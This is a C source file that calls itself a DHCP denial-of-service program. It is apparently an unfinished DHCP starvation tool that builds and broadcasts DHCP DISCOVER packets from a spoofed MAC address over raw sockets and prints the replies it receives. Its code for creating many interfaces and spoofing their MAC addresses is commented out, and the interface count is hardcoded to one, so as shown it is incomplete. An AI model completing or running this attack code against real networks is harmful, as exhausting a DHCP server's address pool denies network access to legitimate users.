/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include "construct_packet.h"
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>

char interface[IFNAMSIZ]={0};
#define ARPHRD_ETHER 	1

struct netlink_msg{
	struct nlmsghdr  nh;
	struct ifinfomsg itf;
	char attrbuf[512];
};
struct dhcp_lease_info{



};
struct mac_address{
	unsigned char hwmac[6];

};



struct dhcp_lease_info *dhcp_protocol(int sd,unsigned char*hwmac,struct ifreq itface);
int strncmp_with_null(unsigned char* s1,unsigned char *s2,int number);
void *initiate_interface(void*arg);
void *recv_worker(void *arg);
int main(int argc,char **argv){

	if(argc!=3){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface> <number of interface to create>\n");
		exit(-1);
	}
	if(strlen(argv[1])>=IFNAMSIZ){
		fprintf(stderr,"interface name too long\n");
		exit(-1);
	}
	int interface_number=1;//atoi(argv[2]);
	if(interface_number>1000){
		fprintf(stderr,"number of interface is too big\n");
		exit(0);
	}

	//Copy interface name to a global variable.
	memcpy(interface,argv[1],IFNAMSIZ);
	
	pthread_t recv_worker_t=0;
	pthread_create(&recv_worker_t,NULL,recv_worker,NULL);
	

	sleep(3);
	
	struct mac_address *hwmac_table=(struct mac_address*)malloc(sizeof(struct mac_address)*interface_number);
	pthread_t* initiate_interface_t=(pthread_t*)malloc(sizeof(pthread_t)*interface_number);
	unsigned char hwmac[6]={0x00,0x0c,0x29,0x10,0xd9,0x2b};

	for(int iii=0;iii<interface_number;iii++){
		memcpy(hwmac_table[iii].hwmac,hwmac,6);
		pthread_create(initiate_interface_t+iii,NULL,initiate_interface,(void*)&hwmac_table[iii]);
		pthread_join(initiate_interface_t[iii],NULL);
	}

	sleep(10);	
	pthread_cancel(recv_worker_t);
	pthread_join(recv_worker_t,NULL);
	return 0;

}
void *initiate_interface(void*arg){
	unsigned char *hwmac=arg;
/*
	//Create a new interface via netlink. Netlink ptotocol is a way to communicate information between userspace and kernel space.
	
	struct rtnl_link *link;
	struct nl_sock *sk;
	int err = 0;
	
	link = rtnl_link_alloc();
	if (!link) {
	    nl_perror(err, "rtnl_link_alloc");
	    goto OUT;
	}
	rtnl_link_set_name(link, "wg0");
	rtnl_link_set_type(link, "wireguard");
	
	sk = nl_socket_alloc();
	err = nl_connect(sk, NETLINK_ROUTE);
	if (err < 0) {
	    nl_perror(err, "nl_connect");
	    goto CLEANUP_LINK;
	}
	err = rtnl_link_add(sk, link, NLM_F_CREATE);
	if (err < 0) {
	    nl_perror(err, "");
	    goto CLEANUP_SOCKET;
	}



*/
	//Get a layer 2 socket with raw format. Raw means we want to construct the header of layer 2 packet on our own.
	int sd;
	if((sd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)))<0){
		perror("socket()");
		exit(-1);
	}

	printf("sd %d\n",sd);
	//get hwaddr of the interface
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,interface,IFNAMSIZ);
	//printf("%s\n",itface.ifr_name);
	
	if(ioctl(sd,SIOCGIFHWADDR, &itface) > 0){
		perror("ioctl(SIOCGIFHWADDR)");	
		exit(-1);
	}
	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}


#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<6;iii++){
		printf(":%02x",(unsigned char)(itface.ifr_hwaddr.sa_data[iii]));

	}
	printf("\n");
#endif
	
/*
	//modify the mac address
	copy_macaddr(itface.ifr_hwaddr.sa_data,hwmac[0],hwmac[1],hwmac[2],hwmac[3],hwmac[4],hwmac[5]);
	if(ioctl(sd, SIOCSIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCSIFHWADDR)");	
		exit(-1);
	}
*/

#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<8;iii++){
		printf(":%02x",(unsigned char)itface.ifr_hwaddr.sa_data[iii]);

	}
	printf("\n");
#endif


	//get interface index
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	//Bind our file descriptor to this interface.
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);
	if(bind(sd,(struct sockaddr*)&ifaddr,sizeof(struct sockaddr_ll))<0){
		perror("bind() interface");
		exit(-1);
	}
	

	//Run dhcp to aquire ip address.
	struct dhcp_lease_info *dli=dhcp_protocol(sd,hwmac,itface);	



	close(sd);
	return 0;

}
struct dhcp_lease_info *dhcp_protocol(int sd,unsigned char*hwmac,struct ifreq itface){

	struct dhcp_lease_info *dli=(struct dhcp_lease_info*)malloc(sizeof(struct dhcp_lease_info));
	memset(dli,0,sizeof(struct dhcp_lease_info));
	unsigned char dstmac[6]={0xff,0xff,0xff,0xff,0xff,0xff};

	//start to construct dhcp datagram
	unsigned char packet[PACKETMAXSIZE];
	unsigned int hip=0;
	unsigned int dip;
	inet_pton(AF_INET,"255.255.255.255",&dip);
	
	//Host ip address will be returned in hip.
	construct_dhcp(12345,DHCP_DISCOVER,hwmac,dstmac,&hip,&dip,packet);

		


	//Ready to send packet.
	//Specify the interface through which we sent our packet.

	struct sockaddr_ll destifaddr;
	memset(&destifaddr,0,sizeof(struct sockaddr_ll));
	destifaddr.sll_halen=ETH_ALEN;
	destifaddr.sll_ifindex=itface.ifr_ifindex;
	//It seems unnecessary to specify the mac address of destination, for we have write it in the packet we created.
	//copy_macaddr((unsigned char*)destifaddr.sll_addr,0x11,dstmac[1],dstmac[2],dstmac[3],dstmac[4],dstmac[5]);
	
	if(sendto(sd,packet,PACKETMAXSIZE,0,(struct sockaddr*)&destifaddr,sizeof(struct sockaddr_ll))<0){
		perror("sendto()");
		exit(-1);
	}

	return dli;
}


void *recv_worker(void *arg){

	int ret_sd=0;
	if((ret_sd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)))<0){
		perror("recv socket()");
		exit(0);
	}
	int broadcast=1;
/*	if(setsockopt(ret_sd,SOL_SOCKET,SO_BROADCAST,&broadcast,sizeof(broadcast))<0){
		perror("setsockopt()");
		exit(0);
	};*/
/*	struct sockaddr_in ret;
	ret.sin_family = AF_INET;
	ret.sin_port = htons(68);
	ret.sin_addr.s_addr = INADDR_ANY;

	//inet_pton(AF_INET,INADDR_BROADCAST,&ret.sin_addr.s_addr);
	//inet_pton(AF_INET,"255.255.255.255",&(ret.sin_addr.s_addr));
	if(bind(ret_sd,(struct sockaddr*)&ret,sizeof(struct sockaddr_in))<0){
		perror("bind()");
		exit(0);

	};*/
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,"ens33",IFNAMSIZ);
	if(ioctl(ret_sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);
	if(bind(ret_sd,(struct sockaddr*)&ifaddr,sizeof(struct sockaddr_ll))<0){
		perror("bind() interface");
		exit(-1);
	}

	printf("ret_sd %d\n",ret_sd);
	unsigned char hwmac[6]={0x00,0x0c,0x29,0x10,0xd9,0x2b};

	unsigned char packet_in[PACKETMAXSIZE]={0};
	struct sockaddr_in dhcp_server;
	memset(&dhcp_server,0,sizeof(struct sockaddr_in));
	unsigned int ret_addr_len=sizeof(struct sockaddr_in);
	int ret_msg_len=0;
	while(1){
		memset(packet_in,0,PACKETMAXSIZE);
		//ret_msg_len=send(ret_sd,packet_in,PACKETMAXSIZE,0);
		//perror("");
		ret_msg_len=recvfrom(ret_sd,packet_in,PACKETMAXSIZE,0,(struct sockaddr*)&dhcp_server,&ret_addr_len);
		if(strncmp_with_null(packet_in,hwmac,6)==0 || strncmp_with_null(packet_in,"\xff\xff\xff\xff\xff\xff",6)==0){
			printf("recv %d\n",ret_msg_len);
			for(int iii=0;iii<ret_msg_len;iii++){

				printf("/x%02x",packet_in[iii]);
			}
			
			printf("\n");
		};


	}

	return NULL;
}
int strncmp_with_null(unsigned char* s1,unsigned char *s2,int number){
	int count=0;
	while( (*s1==*s2) ){
		if(++count>=number) break;
		s1++;
		s2++;
		
	}
	return *s1-*s2;

}
